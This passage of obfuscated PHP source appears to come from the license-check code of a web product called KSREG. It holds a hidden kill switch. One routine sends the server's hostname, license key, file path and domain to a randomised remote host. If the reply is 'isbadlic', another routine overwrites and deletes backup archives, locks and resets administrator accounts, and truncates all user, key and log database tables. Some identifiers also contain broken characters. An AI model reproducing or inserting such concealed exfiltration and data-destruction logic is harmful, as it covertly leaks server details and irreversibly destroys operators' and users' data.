    $_obf_joiNh4aIhouViZGQho_JiI4� = curl_init( );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_URL, "http://chk".mt_rand( 100000, 999999 ).".hphu.com/skey/api.php?r=".time( ) );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_RETURNTRANSFER, 1 );
    $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� = "svrid=".SVRID."&hostname=".$_obf_iJSGk5WKlIaUiI6SjZCTh4c�."&skey=".PRV_SVRLIC."&spath=".dirname( __FILE__ )."&domain=".$_obf_i5WSh4iUj4aKi5WVk42Jh5U�."&weblic=".urlencode( WEBLIC )."&webid=".urlencode( WEBID )."&nowtime=".date( "Y-m-d H:i:s" );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POST, 1 );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_POSTFIELDS, $_obf_hoeUj5OSh5CMlI2Qh42Ijoc� );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; SV1)" );
    curl_setopt( $_obf_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HTTPHEADER, array( "Accept-Language: zh-cn", "Connection: close", "Cache-Control: no-cache" ) );
    $_obf_lJCJh4yIiZSPi5WUko2Nh4g� = curl_exec( $_obf_joiNh4aIhouViZGQho_JiI4� );
    if ( curl_errno( $_obf_joiNh4aIhouViZGQho_JiI4� ) )
    {
        @curl_close( $_obf_joiNh4aIhouViZGQho_JiI4� );
    }
    else
    {
        curl_close( $_obf_joiNh4aIhouViZGQho_JiI4� );
        if ( $_obf_lJCJh4yIiZSPi5WUko2Nh4g� == "isbadlic" )
        {
            _obf_ipORj42NiZCIio_LkZORhpE�( "clear,curl badlist" );
            _obf_koyMjY2HkImOho6JkIeQh4c�( );
        }
    }
}

function _obf_iZSOiYeSlIqPjpSLkpSIj40�( )
{
    $_obf_kY2Rj4mPjoaGjoeMjpOKhpM� = explode( ",", substr( WEBLIC, 33 ) );
    $_obf_lJOVj5WVkI2PjI6QjZWJjoY� = $_SERVER['HTTP_HOST'];
    $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = strpos( $_obf_lJOVj5WVkI2PjI6QjZWJjoY�, ":" );
    if ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� !== FALSE )
    {
        $_obf_lJOVj5WVkI2PjI6QjZWJjoY� = substr( $_obf_lJOVj5WVkI2PjI6QjZWJjoY�, 0, $_obf_jpKPlJSUiZOHkYaPlIeOiY4� );
    }
    if ( in_array( strtolower( $_obf_lJOVj5WVkI2PjI6QjZWJjoY� ), $_obf_kY2Rj4mPjoaGjoeMjpOKhpM� ) )
    {
        if ( isset( $_SERVER['ALL_HTTP'] ) && stristr( $_SERVER['ALL_HTTP'], $_obf_lJOVj5WVkI2PjI6QjZWJjoY� ) === FALSE )
        {
            _obf_ipORj42NiZCIio_LkZORhpE�( "497A,no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
            _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "497", "域名绑定出错，谢谢使用，请支持正版软件！" );
        }
    }
    else
    {
        _obf_ipORj42NiZCIio_LkZORhpE�( "497B, no clear,domain err:\r\n".$_SERVER['HTTP_HOST']."\r\n".$_SERVER['ALL_HTTP'] );
        _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "497", "域名绑定出错，谢谢使用，请支持正版软件！" );
        exit( "Domain binding errors,  Thank you for using KSREG! ALL_HTTP! HTTP_HOST" );
    }
}

function _obf_ipORj42NiZCIio_LkZORhpE�( $_obf_h4yHlYmLipCJjJCGhomJjZA� )
{
    if ( !is_file( "clsdata.log" ) )
    {
        @file_put_contents( "clsdata.log", date( "ymdHis" )."\t".$_obf_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "clsdata.log", date( "ymdHis" )."\t".$_obf_h4yHlYmLipCJjJCGhomJjZA�."\r\n\r\n", FILE_APPEND );
    }
}

function _obf_koyMjY2HkImOho6JkIeQh4c�( $_obf_koqQlY6KkIePi4mHi4uHh5U� = "" )
{
    global $_obf_mGKRY4dMuU6bZZJfh1_TX5k�;
    if ( $_obf_koqQlY6KkIePi4mHi4uHh5U� != "" )
    {
        $_obf_mGKRY4dMuU6bZZJfh1_TX5k� = $_obf_koqQlY6KkIePi4mHi4uHh5U�;
    }
    file_put_contents( KSSLOGDIR."index.log", "200001011059550389" );
    if ( defined( "NOTDELMYSQL" ) )
    {
        _obf_ipORj42NiZCIio_LkZORhpE�( "500B, no clear,clearuserdata" );
        _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
    }
    $_obf_j4uLj5OUi42Gh5SQlYiOjIc� = _obf_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( !empty( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obf_j4uLj5OUi42Gh5SQlYiOjIc� as $_obf_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obf_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obf_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_jIuSjYuUkJGHlYuPjZOQjY4�( $_obf_mGKRY4dMuU6bZZJfh1_TX5k� );
    $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_user_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_z_key_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
    _obf_ipORj42NiZCIio_LkZORhpE�( "500C, clearuserdata" );
    _obf_j5CLlY6TlYqUiI_VlI6Vk5Q�( "500", "谢谢使用，请支持正版软件！" );
}

$GLOBALS['_GET']['vmpbegin'] = 0;
$GLOBALS['_GET']['vmpend'] = 0;
?>
